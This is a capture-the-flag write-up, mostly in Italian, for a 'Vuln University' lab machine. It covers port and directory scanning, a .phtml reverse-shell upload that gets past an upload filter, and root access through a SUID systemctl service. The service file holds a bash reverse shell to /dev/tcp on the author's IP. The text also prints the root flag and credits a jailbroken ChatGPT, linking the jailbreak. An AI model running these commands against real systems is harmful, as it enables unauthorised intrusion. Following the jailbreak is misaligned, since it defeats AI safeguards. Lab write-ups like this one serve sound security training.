@@ -1,0 +1,224 @@
+### INFORMATION GATHERING 
+
+╰─ sudo nmap -Pn 10.10.110.1 -A
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-21 22:34 CEST
+
+Nmap scan report for 10.10.110.1
+Host is up (0.046s latency).
+Not shown: 994 closed tcp ports (reset)
+PORT     STATE SERVICE     VERSION
+21/tcp   open  ftp         vsftpd 3.0.3
+22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 5a:4f:fc:b8:c8:76:1c:b5:85:1c:ac:b2:86:41:1c:5a (RSA)
+|   256 ac:9d:ec:44:61:0c:28:85:00:88:e9:68:e9:d0:cb:3d (ECDSA)
+|_  256 30:50:cb:70:5a:86:57:22:cb:52:d9:36:34:dc:a5:58 (ED25519)
+139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
+3128/tcp open  http-proxy  Squid http proxy 3.5.12
+|_http-title: ERROR: The requested URL could not be retrieved
+|_http-server-header: squid/3.5.12
+3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Vuln University
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.94SVN%E=4%D=6/21%OT=21%CT=1%CU=44773%PV=Y%DS=2%DC=T%G=Y%TM=6675
+OS:E508%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10A%TI=Z%CI=I%TS=8)SEQ(S
+OS:P=105%GCD=1%ISR=10A%TI=Z%CI=I%II=I%TS=8)SEQ(SP=105%GCD=1%ISR=10A%TI=Z%CI
+OS:=RD%II=I%TS=8)SEQ(SP=106%GCD=1%ISR=10A%TI=Z%CI=I%II=I%TS=8)OPS(O1=M508ST
+OS:11NW6%O2=M508ST11NW6%O3=M508NNT11NW6%O4=M508ST11NW6%O5=M508ST11NW6%O6=M5
+OS:08ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(R=Y%DF=Y%
+OS:T=40%W=6903%O=M508NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)
+OS:T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=
+OS:40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0
+OS:%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=
+OS:Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=
+OS:G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)
+
+Network Distance: 2 hops
+Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2024-06-21T20:39:33
+|_  start_date: N/A
+|_nbstat: NetBIOS name: VULNUNIVERSITY, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
+| smb-os-discovery: 
+|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
+|   Computer name: vulnuniversity
+|   NetBIOS computer name: VULNUNIVERSITY\x00
+|   Domain name: \x00
+|   FQDN: vulnuniversity
+|_  System time: 2024-06-21T16:39:33-04:00
+|_clock-skew: mean: 1h20m00s, deviation: 2h18m34s, median: 0s
+
+TRACEROUTE (using port 587/tcp)
+HOP RTT      ADDRESS
+1   45.46 ms 10.8.0.1
+2   45.58 ms 10.10.110.1
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 279.21 seconds
+
+─ enum4linux 10.10.110.1 
+
+=========================================( Target Information )=========================================
+
+Target ........... 10.10.110.1
+RID Range ........ 500-550,1000-1050
+Username ......... ''
+Password ......... ''
+Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
+
+
+ ============================( Enumerating Workgroup/Domain on 10.10.110.1 )============================
+
+
+[+] Got domain/workgroup name: WORKGROUP
+
+
+ ================================( Nbtstat Information for 10.10.110.1 )================================
+
+Looking up status of 10.10.110.1
+        VULNUNIVERSITY  <00> -         B <ACTIVE>  Workstation Service
+        VULNUNIVERSITY  <03> -         B <ACTIVE>  Messenger Service
+        VULNUNIVERSITY  <20> -         B <ACTIVE>  File Server Service
+        ..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser
+        WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
+        WORKGROUP       <1d> -         B <ACTIVE>  Master Browser
+        WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections
+
+        MAC Address = 00-00-00-00-00-00
+
+
+
+─ gobuster
+
+╰─ gobuster dir -u http://10.10.110.1:3333 -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.110.1:3333
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/.htaccess            (Status: 403) [Size: 297]
+/.hta                 (Status: 403) [Size: 292]
+/.htpasswd            (Status: 403) [Size: 297]
+/css                  (Status: 301) [Size: 315] [--> http://10.10.110.1:3333/css/]
+/fonts                (Status: 301) [Size: 317] [--> http://10.10.110.1:3333/fonts/]
+/images               (Status: 301) [Size: 318] [--> http://10.10.110.1:3333/images/]
+/index.html           (Status: 200) [Size: 33014]
+/internal             (Status: 301) [Size: 320] [--> http://10.10.110.1:3333/internal/]  <--- Directory interessante. Quindi lo cerco sul browser e vedo che ho un form per l'upload dei file
+/js                   (Status: 301) [Size: 314] [--> http://10.10.110.1:3333/js/]
+/server-status        (Status: 403) [Size: 301]
+Progress: 4727 / 4727 (100.00%)
+===============================================================
+Finished
+===============================================================
+
+
+vedo che posso fare l'upload di file, quindi provo ad uploadare un file .php, ma non lo accetta, idem con .php3/.php5 etc, quindi provo con .phtml
+il file che sto andando ad uploadare è una reverse shell, che prendo da qui: https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
+e ci cambio IP e PORT (mettendo quelli del mio pc)
+
+poi vado ad uploadare il file shell.phtml e vedo che lo ha caricato, quindi vedo che sulla pagina http://10.10.110.1:3333/internal/uploads/ ho il file, allora basta che ci clicco sopra OPPURE lo cerco, cioè:
+http://10.10.110.1:3333/internal/uploads/shell.phtml
+ovviamente prima di fare ciò mi metto in ascolto con netcat: nc -lvnp 9001
+
+e vedo che ottengo una shell
+
+
+### PRIV ESC ###
+
+vedo che facendo il comando: find / -user root -perm /4000
+trovo che /bin/systemctl ha una misconfigurazione dell'SUID e quindi la sfrutto, potrei andare su GTFOBins oppure cercare su internet "systemctl privilege escalation"
+
+quindi cercandolo, trovo la repo github: https://gist.github.com/A1vinSmith/78786df7899a840ec43c5ddecb6a4740
+
+e faccio come segue nella guida:
+
+1) creo un file payload.service sulla mia macchina kali e dentro ci scrivo:
+
+[Unit]
+Description=roooooooooot
+
+[Service]
+Type=simple
+User=root
+ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.8.107.68/9999 0>&1'
+
+[Install]
+WantedBy=multi-user.target
+
+2) trovo una directory scrivibile con il comando:
+find / -type d -maxdepth 2 -writable
+
+3) trasferisco il file dalla mia macchina kali alla macchina vittima e lo posso fare con netcat
+   sulla macchina vittima, prima faccio il cd sulle dir scrivibili (nel mio caso /tmp/):
+   nc -vl 44444 > root.service
+   
+   sulla macchina kali:
+   nc -n 10.10.110.1 44444 < root.service (10.10.110.1 è l'ip della macchina vittima)
+   
+   e facendo così trasferisco il file, nel caso dovessi tornare indietro e faccio ctrl+c, mi esce anche dalla sessione della reverse shell, allora basta riandare sul file shell.phtml e cliccarci (ovviamente con nc -lvnp 9001 in ascolto)
+   
+   non capisco perchè non funziona. Provo ad aprire systemctl facendo cat /bin/systemctl
+   
+   però è un eseguibile quindi me lo passo sulla macchina kali per analizzarlo con ghidra e faccio così: (SPOILER: Passaggio inutile :> è buono solo per capire come passare un file dalla macchina vittima a kali e viceversa)
+   
+   Macchina Vittima, faccio cd /bin/ (così ho systemctl nella cartella):
+   python3 -m http.server 9999 (controllo prima che abbia python installato con il comando which python)
+   
+   Macchina Kali:
+   wget 10.10.110.1:9999/systemctl <- e mi si scarica nella directory dove ho fatto wget, ora lo analizzo con ghidra
+   
+### GHIDRA ###
+
+    Pare niente di che, ritorno sulla strada di prima per far eseguire il systemctl direttamente da lì, avendo il SUID attivo, però sta volta provo quello scritto su GTFOBins 
+ 
+### PRIV ESC PT.2 ###
+    
+    Quindi copio ed incollo una riga per volta il prompt dato da GTFOBins nella parte del SUID di systemctl
+    
+    TF=$(mktemp).service
+    echo '[Service]
+    Type=oneshot
+    ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/output" <--- su GTFOBins ho "id" invece che "cat /root/root.txt" ma è quello che voglio eseguire e far mettere nel file /tmp/output
+    [Install]
+    WantedBy=multi-user.target' > $TF
+    systemctl link $TF 					    <--- molte volte ho un ./ davanti, ma non serve quando lo incollo
+    systemctl enable --now $TF
+    
+    facendo poi: cat /tmp/output ottengo la flag del root: a58ff8579f0a9270368d33a9966c7fd5
+    
+    ------- OPPURE un altro modo che ho trovato facendomi aiutare da ChatGPT Jailbreakkato ( Jailbreak per ChatGPT qui -> https://gist.github.com/coolaj86/6f4f7b30129b0251f61fa7baaa881516 ) è
+    
+    TF=$(mktemp).service
+    echo '[Service]
+    Type=oneshot
+    ExecStart=/bin/sh -c “chmod +s /bin/bash” <--- Modificato
+    [Install]
+    WantedBy=multi-user.target' > $TF
+    systemctl link $TF 					    <--- molte volte ho un ./ davanti, ma non serve quando lo incollo
+    systemctl enable --now $TF
+    
+    facendo poi: bash -p, vado in "ascolto" poi faccio whoami e rifacendo bash -p, mi dà che sono root allora basta fare cat /root/root.txt ed ottenere la flag
+   
+FINE :)
